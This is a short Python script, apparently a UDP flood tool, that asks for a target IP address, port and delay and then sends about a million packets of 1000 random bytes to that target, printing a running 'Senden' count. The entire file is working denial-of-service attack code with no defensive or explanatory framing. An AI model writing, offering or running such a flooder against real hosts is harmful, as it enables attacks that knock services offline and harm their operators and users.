import socket
import random
import time

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
ip = input("Target-IP:")
port = int(input("Target-Port: "))
sleep = float(input("Sleep: "))

s.connect((ip, port))

for i in range(1, 1001000):
    s.send(random._urandom(1000))
    print(f"Senden: {i}", end='\r')
    time.sleep(sleep)
